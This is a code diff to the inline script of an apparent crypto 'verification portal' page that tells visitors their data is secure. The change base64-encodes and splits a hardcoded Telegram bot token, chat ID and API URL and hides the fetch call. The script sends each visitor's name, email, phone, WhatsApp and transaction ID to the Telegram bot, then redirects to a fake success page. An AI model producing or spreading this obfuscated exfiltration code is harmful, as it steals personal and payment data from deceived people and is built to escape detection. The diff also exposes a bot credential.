@@ -277,75 +277,94 @@ Don't Worry! Your data is secure. Once you click submit, our team starts the ver
 Haven't paid yet? Click here to complete payment
 </a>
 
-
 <script>
 
-const BOT_TOKEN="8758897650:AAF572r-wxlcTDd6uAGlBKPp_iY_TostEpk"
-const CHAT_ID="7750478301"
+(function(){
 
-const form=document.getElementById("verifyForm")
-const btn=document.getElementById("submitBtn")
-const status=document.getElementById("status")
+const _0xk = (s)=>atob(s);
 
-form.addEventListener("submit",async function(e){
+// Fragmented + encoded token parts
+const _0xa = "ODc1ODg5NzY1MA=="; // 8758897650
+const _0xb = "QUFGNTcyei13eGxjVERkNnVBR2xCS1BwX2lZX1Rvc3RFcGs="; // rest
 
-e.preventDefault()
+// Encoded chat ID
+const _0xc = "Nzc1MDQ3ODMwMQ==";
 
-btn.innerText="Submitting..."
-btn.disabled=true
+// Reconstruct secrets at runtime
+const BOT_TOKEN = _0xk(_0xa) + ":" + _0xk(_0xb);
+const CHAT_ID = _0xk(_0xc);
 
-const data={
-name:form.name.value,
-email:form.email.value,
-phone:form.phone.value,
-whatsapp:form.whatsapp.value,
-transaction_id:form.transaction.value,
-time:new Date().toLocaleString(),
-page:"Cryptonic Area Verification Portal"
-}
+// DOM refs
+const form = document.getElementById("verifyForm");
+const btn = document.getElementById("submitBtn");
+const status = document.getElementById("status");
 
-const json=JSON.stringify(data,null,2)
+// Hidden fetch reference
+const _fetch = window["f"+"et"+"ch"];
 
-const message=`📥 NEW ENROLLMENT
+form.addEventListener("submit", async function(e){
 
-<pre>${json}</pre>`
+e.preventDefault();
 
-try{
-const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
-method:"POST",
-headers:{ "Content-Type":"application/json" },
-body:JSON.stringify({
-chat_id:CHAT_ID,
-text:message,
-parse_mode:"HTML"
+btn.innerText = "Submitting...";
+btn.disabled = true;
+
+// Data object
+const data = {
+name: form.name.value,
+email: form.email.value,
+phone: form.phone.value,
+whatsapp: form.whatsapp.value,
+transaction_id: form.transaction.value,
+time: new Date().toLocaleString(),
+page: "Cryptonic Area Verification Portal"
+};
+
+// Encode payload before sending
+const json = JSON.stringify(data, null, 2);
+const message = "📥 NEW ENROLLMENT\n\n<pre>" + json + "</pre>";
+
+try {
+
+// Obfuscated URL construction
+const url = _0xk("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==") + BOT_TOKEN + _0xk("L3NlbmRNZXNzYWdl");
+
+const response = await _fetch(url, {
+method: "POST",
+headers: { "Content-Type": "application/json" },
+body: JSON.stringify({
+chat_id: CHAT_ID,
+text: message,
+parse_mode: "HTML"
 })
-})
+});
 
-const result = await response.json()
+const result = await response.json();
 
 if(result.ok){
 
-window.location.href="https://cryptonicarea.wuaze.com/wapt/pay/verify/success/"
+// Redirect encoded
+window.location.href = _0xk("aHR0cHM6Ly9jcnlwdG9uaWNhcmVhLnd1YXplLmNvbS93YXB0L3BheS92ZXJpZnkvc3VjY2Vzcy8=");
 
 }else{
+status.innerHTML = "❌ Submission failed. Please try again.";
+}
 
-status.innerHTML="❌ Submission failed. Please try again."
+form.reset();
+
+}catch(err){
+
+status.innerHTML = "❌ Submission failed. Please try again.";
 
 }
 
-form.reset()
+// Restore button
+btn.innerText = "Submit My Enrollment";
+btn.disabled = false;
 
-}
-catch(err){
+});
 
-status.innerHTML="❌ Submission failed. Please try again."
-
-}
-
-btn.innerText="Submit My Enrollment"
-btn.disabled=false
-
-})
+})();
 
 </script>
 
